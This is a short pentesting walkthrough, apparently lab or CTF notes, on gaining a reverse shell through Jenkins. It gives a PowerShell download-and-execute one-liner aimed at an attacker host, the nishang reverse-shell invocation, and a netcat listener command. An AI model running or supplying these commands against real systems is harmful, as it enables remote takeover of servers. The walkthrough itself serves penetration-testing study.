After logging into jenkins we can exploit the Build Project function see here:

https://book.hacktricks.xyz/pentesting/pentesting-web/jenkins#create-a-new-project

---

After creating a project, we can have it execute Windows batch command
Build > execute windows batch command. We give it the following command:

```powershell
powershell iex (New-Object Net.WebClient).DownloadString('http://ATTACKIP:ATTACK-HTTP-SERV-PORT/Invoke-PowerShellTcp.ps1')
```

---

We also download the script from here:

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

We append this to the end of the script:
```powershell
Invoke-PowerShellTcp -Reverse -IPAddress your-ip -Port your-port
```

--- 
We serve up the `Invoke-PowerShellTcp.ps1` file on a http server and open a netcat listener `nc -lvnp 4444`

We then build the project on Jenkins and this will execute the exploit and send a shell to our nc listener.